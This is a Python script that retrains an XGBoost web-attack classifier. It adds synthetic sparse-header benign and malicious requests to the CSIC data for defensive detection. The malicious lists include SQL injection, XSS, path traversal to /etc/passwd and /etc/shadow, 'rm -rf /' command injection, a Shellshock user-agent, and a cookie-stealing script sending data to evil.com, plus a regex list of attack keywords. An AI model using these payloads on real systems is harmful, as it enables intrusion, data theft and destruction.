"""Retrains the web-attack model (csic_web_attack_model.pkl) with sparse-header
traffic augmentation. Run from the repo root: `python notebooks/retrain_web_attack_augmented.py`

## Why this exists

Live testing against the deployed model found it flagged genuinely benign requests as
"Anomalous" purely because they had few/no headers set — a bare `{"method": "GET"}` with
nothing else scored 78% anomalous, and `id=42` alone scored 98.8%, both well above the
alert threshold. Root cause, confirmed by inspecting the real CSIC training data: every
real training example (both Valid and Anomalous) has the full standard header set
populated — the shortest real training example is 35 characters of concatenated header
text; nothing resembling a bare/minimal request (curl, mobile SDKs, server-to-server
calls — the kind of traffic most real API clients actually send) exists anywhere in
training. The model had never seen anything like it and extrapolated unreliably.

## The fix

Data augmentation, not a hyperparameter change — add synthetic sparse-header examples to
**both** classes:
- Benign sparse traffic (lightweight clients: curl, okhttp, axios, Postman, blank UA) so
  "few headers" stops being a usable shortcut for "anomalous."
- Malicious sparse traffic (real attack payloads — SQLi/XSS/traversal/command-injection —
  combined with minimal headers, including known attack-tool UAs) so the model can't swing
  the other way and learn "few headers -> always benign" instead. Real attackers commonly
  use minimal headers too (curl, sqlmap, scripts).

This forces the model to weight actual malicious *content* (the suspicious-keyword/
special-char features it already computes) rather than header completeness either way.

Reuses the exact hyperparameters already found by the real Kaggle RandomizedSearchCV run
(XGBoost, n_estimators=400, max_depth=9, learning_rate=0.1, subsample=1.0,
colsample_bytree=1.0, from model_metadata.json) — this is a training-data fix, not a
hyperparameter search, so there's no need to re-run tuning.

## After running this

There's still a real, unavoidable trade-off: raising attack sensitivity on sparse-header
traffic costs some precision on realistic (non-minimal) benign content — e.g. a normal
multi-word search query can score ~50-84% anomalous with this augmented model, versus
99.5-100% for genuine attacks. There's a clean separation in that gap, which is why
`ml-service/.env` and `backend/.env`'s `ANOMALY_CONFIDENCE_THRESHOLD` was raised from
0.85 to 0.90 alongside this retrain — verified against both attack and benign test cases
before shipping. If you retrain again, re-verify the threshold still cleanly separates the
two populations; don't assume 0.90 is permanently correct for a differently-augmented model.
"""

import random
import re
import warnings
from pathlib import Path

import joblib
import numpy as np
import pandas as pd
from sklearn.compose import ColumnTransformer
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics import classification_report, roc_auc_score
from sklearn.model_selection import train_test_split
from sklearn.pipeline import Pipeline
from sklearn.preprocessing import OneHotEncoder, StandardScaler
from xgboost import XGBClassifier

warnings.filterwarnings("ignore")
random.seed(42)
np.random.seed(42)
RANDOM_STATE = 42

REPO_ROOT = Path(__file__).resolve().parent.parent
DATA_PATH = REPO_ROOT / "data" / "csic_ecml_normalized_final.csv"
OUT_MODEL_PATH = REPO_ROOT / "PklFiles" / "csic_web_attack_model.pkl"

# ---------------------------------------------------------------------------
# 1. Load real data
# ---------------------------------------------------------------------------
df = pd.read_csv(DATA_PATH)
print("Original shape:", df.shape)

# ---------------------------------------------------------------------------
# 2. Sparse-header BENIGN augmentation
# ---------------------------------------------------------------------------
LIGHTWEIGHT_UAS = [
    "curl/7.68.0", "curl/8.5.0", "curl/8.1.2",
    "okhttp/4.9.0", "okhttp/4.11.0",
    "Go-http-client/1.1", "axios/1.4.0", "axios/1.6.2",
    "AutoQualAgent/1.0", "Postman/10.18.0",
    "", "",  # some clients send no UA at all
]
BENIGN_QUERIES = [
    "", "", "",  # empty is common
    "id=42", "id=7", "page=2", "page=1&limit=20",
    "user_id=8823", "format=json", "sort=created_at",
    "offset=0&limit=10", "status=active", "lang=en",
]
BENIGN_POST_BODIES = [
    "", "", "",
    "name=John&email=john%40example.com",
    "amount=29.99&currency=USD",
    '{"status":"ok"}',
    "quantity=2&product_id=118",
    "token=abc123def456",
]
CONTENT_TYPES = ["", "application/json", "application/x-www-form-urlencoded"]
METHODS = ["GET", "GET", "GET", "POST", "POST", "PUT"]


def make_sparse_valid_row():
    method = random.choice(METHODS)
    has_body = method in ("POST", "PUT") and random.random() < 0.6
    return {
        "Class": "Valid",
        "Method": method,
        "Host-Header": random.choice(["HTTP/1.1", "HTTP/1.0"]),
        "Connection": random.choice(["keep-alive", "close", ""]),
        "Accept": random.choice(["*/*", "application/json", ""]),
        "Accept-Charset": "",
        "Accept-Language": "",
        "Cache-control": "",
        "Pragma": "",
        "User-Agent": random.choice(LIGHTWEIGHT_UAS),
        "Content-Type": random.choice(CONTENT_TYPES) if has_body else "",
        "POST-Data": random.choice(BENIGN_POST_BODIES) if has_body else "",
        "GET-Query": random.choice(BENIGN_QUERIES) if method == "GET" else "",
    }


N_AUGMENT = 2500
augmented_rows = [make_sparse_valid_row() for _ in range(N_AUGMENT)]
# The exact bare case that broke in live testing
for _ in range(100):
    augmented_rows.append({
        "Class": "Valid", "Method": "GET", "Host-Header": "", "Connection": "",
        "Accept": "", "Accept-Charset": "", "Accept-Language": "", "Cache-control": "",
        "Pragma": "", "User-Agent": "", "Content-Type": "", "POST-Data": "", "GET-Query": "",
    })

# ---------------------------------------------------------------------------
# 2b. Sparse-header MALICIOUS augmentation — without this, the model swings to
# the opposite spurious shortcut ("sparse headers -> always Valid"). Real
# attackers commonly use minimal headers too (curl, sqlmap, scripts).
# ---------------------------------------------------------------------------
MALICIOUS_QUERIES = [
    "id=1' OR '1'='1", "id=1 UNION SELECT username,password FROM users",
    "id=5' OR '1'='1'; DROP TABLE users;--", "search=<script>alert(document.cookie)</script>",
    "img=<img src=x onerror=alert(1)>", "file=../../../../etc/passwd",
    "path=..%2f..%2f..%2fetc%2fpasswd", "host=127.0.0.1;cat /etc/shadow",
    "cmd=127.0.0.1 && rm -rf /", "q=' OR SLEEP(5)--", "id=1;exec master..xp_cmdshell",
]
MALICIOUS_POST_BODIES = [
    "username=admin'--&password=x", "id=1' UNION SELECT NULL,NULL,NULL--",
    "cmd=`cat /etc/passwd`", "data=<script>document.location='http://evil.com/'+document.cookie</script>",
    "file=php://filter/convert.base64-encode/resource=index",
]
ATTACK_TOOL_UAS = [
    "sqlmap/1.7.2", "sqlmap/1.6", "Nikto/2.1.6", "() { :; }; echo vulnerable",
    "curl/7.68.0", "python-requests/2.28.1", "",  # attackers use plain/no UA too
]


def make_sparse_anomalous_row():
    method = random.choice(["GET", "GET", "POST"])
    use_query = method == "GET" or random.random() < 0.3
    return {
        "Class": "Anomalous",
        "Method": method,
        "Host-Header": random.choice(["HTTP/1.1", "HTTP/1.0", ""]),
        "Connection": random.choice(["keep-alive", "close", ""]),
        "Accept": random.choice(["*/*", ""]),
        "Accept-Charset": "",
        "Accept-Language": "",
        "Cache-control": "",
        "Pragma": "",
        "User-Agent": random.choice(ATTACK_TOOL_UAS),
        "Content-Type": random.choice(["", "application/x-www-form-urlencoded"]) if method == "POST" else "",
        "POST-Data": random.choice(MALICIOUS_POST_BODIES) if method == "POST" else "",
        "GET-Query": random.choice(MALICIOUS_QUERIES) if use_query else "",
    }


augmented_rows += [make_sparse_anomalous_row() for _ in range(1800)]

aug_df = pd.DataFrame(augmented_rows)
print("Augmentation rows:", aug_df.shape)
print(aug_df["Class"].value_counts())

df_aug = pd.concat([df, aug_df], ignore_index=True)
print("Augmented shape:", df_aug.shape)
print(df_aug["Class"].value_counts())

# ---------------------------------------------------------------------------
# 3. Feature engineering (verbatim from csic_ecml_web_attack_classifier.ipynb —
# must stay in sync with that notebook and with
# ml-service/app/feature_engineering/web_attack.py)
# ---------------------------------------------------------------------------
SUSPICIOUS_PATTERNS = [
    r"select\s+.*\s+from", r"union\s+select", r"drop\s+table", r"insert\s+into",
    r"<script", r"javascript:", r"onerror\s*=", r"onload\s*=",
    r"\.\./", r"etc/passwd", r"cmd\.exe", r"/bin/sh",
    r"%3cscript", r"%27", r"--\s", r";\s*--", r"exec\s*\(", r"alert\s*\("
]
SUSPICIOUS_RE = re.compile("|".join(SUSPICIOUS_PATTERNS), re.IGNORECASE)

TEXT_COLS = [
    "Host-Header", "Accept", "Accept-Charset", "Accept-Language",
    "Cache-control", "Pragma", "User-Agent", "Content-Type",
    "POST-Data", "GET-Query"
]


def engineer_features(raw_df):
    out = raw_df.copy()
    for col in TEXT_COLS:
        out[col] = out[col].fillna("")
    out["combined_text"] = out[TEXT_COLS].agg(" ".join, axis=1)
    out["post_len"] = out["POST-Data"].str.len()
    out["query_len"] = out["GET-Query"].str.len()
    out["combined_len"] = out["combined_text"].str.len()
    out["special_char_count"] = out["combined_text"].apply(
        lambda t: sum(t.count(c) for c in ["<", ">", "'", '"', ";", "%"])
    )
    out["digit_count"] = out["combined_text"].apply(lambda t: sum(ch.isdigit() for ch in t))
    out["suspicious_keyword_count"] = out["combined_text"].apply(lambda t: len(SUSPICIOUS_RE.findall(t)))
    out["has_post_data"] = (out["POST-Data"] != "").astype(int)
    out["has_get_query"] = (out["GET-Query"] != "").astype(int)
    out["Method"] = out["Method"].fillna("UNKNOWN")
    out["Connection"] = out["Connection"].fillna("unknown")
    return out


df_feat = engineer_features(df_aug)

NUMERIC_FEATURES = [
    "post_len", "query_len", "combined_len", "special_char_count",
    "digit_count", "suspicious_keyword_count", "has_post_data", "has_get_query"
]
CATEGORICAL_FEATURES = ["Method", "Connection"]
TEXT_FEATURE = "combined_text"

preprocessor = ColumnTransformer(transformers=[
    ("num", StandardScaler(), NUMERIC_FEATURES),
    ("cat", OneHotEncoder(handle_unknown="ignore"), CATEGORICAL_FEATURES),
    ("text", TfidfVectorizer(max_features=3000, ngram_range=(1, 2), min_df=2), TEXT_FEATURE),
])

y = (df_feat["Class"] == "Anomalous").astype(int)

X_train, X_test, y_train, y_test = train_test_split(
    df_feat, y, test_size=0.2, random_state=RANDOM_STATE, stratify=y
)
print("Train:", X_train.shape, " Test:", X_test.shape)

# ---------------------------------------------------------------------------
# 4. Train with the already-known-good hyperparameters (no re-search needed —
# this is a data fix, not a hyperparameter fix)
# ---------------------------------------------------------------------------
clf = XGBClassifier(
    n_estimators=400, max_depth=9, learning_rate=0.1,
    subsample=1.0, colsample_bytree=1.0,
    eval_metric="logloss", random_state=RANDOM_STATE, n_jobs=-1
)
pipeline = Pipeline([("preprocess", preprocessor), ("clf", clf)])
pipeline.fit(X_train, y_train)

preds = pipeline.predict(X_test)
proba = pipeline.predict_proba(X_test)[:, 1]
print()
print(classification_report(y_test, preds, target_names=["Valid", "Anomalous"]))
print("ROC-AUC:", roc_auc_score(y_test, proba))

joblib.dump(pipeline, OUT_MODEL_PATH)
print("\nSaved retrained model to:", OUT_MODEL_PATH)
print("Remember to also copy it into ml-service/models/csic_web_attack_model.pkl and restart ml-service.")
